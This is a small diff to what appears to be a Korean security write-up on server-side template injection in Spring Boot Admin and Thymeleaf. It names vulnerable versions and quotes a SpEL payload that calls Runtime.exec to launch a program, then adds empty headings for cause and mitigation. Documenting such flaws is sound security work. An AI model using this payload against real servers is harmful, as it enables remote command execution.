@@ -4,3 +4,6 @@
 #### 취약 환경: Spring Boot Admin <= 3.1.0 RELEASE / Tymeleaf <= 3.1.1 RELEASE
 #### 공격 예시 1 / 공격 구문 : ${T(java.lang.Runtime).getRuntime().exec('calc')} (SPEL / Spring Expression Language)
 ![SSTI](https://github.com/user-attachments/assets/355b0362-2200-4c5f-b166-66d4b28903f3)
+### 취약점 원인:  
+### 보안 방법:  
+
